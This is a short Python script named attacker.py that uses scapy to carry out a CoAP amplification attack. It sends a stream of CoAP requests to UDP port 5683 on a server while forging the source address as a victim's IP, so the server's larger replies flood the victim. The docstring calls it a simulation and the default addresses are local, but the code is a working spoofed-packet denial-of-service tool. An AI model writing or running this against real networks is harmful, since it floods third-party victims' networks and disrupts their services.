# attacker.py
from scapy.all import *
import time

def run_attack(server_ip, victim_ip, num_packets=100):
    """Simulates a CoAP amplification attack by sending requests with a spoofed source IP."""
    print(f"Starting CoAP amplification attack...")
    print(f"Target Server: {server_ip}, Spoofed Victim: {victim_ip}")

    for i in range(num_packets):
        coap_payload = b'\x40\x01\x00\x01\xb5large'
        
        packet = IP(src=victim_ip, dst=server_ip) / UDP(sport=RandShort(), dport=5683) / Raw(load=coap_payload)
        
        send(packet, verbose=0)
        time.sleep(0.05)

    print("Attack traffic generation complete.")

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    VICTIM_IP = "192.168.1.100"
    
    run_attack(SERVER_IP, VICTIM_IP)
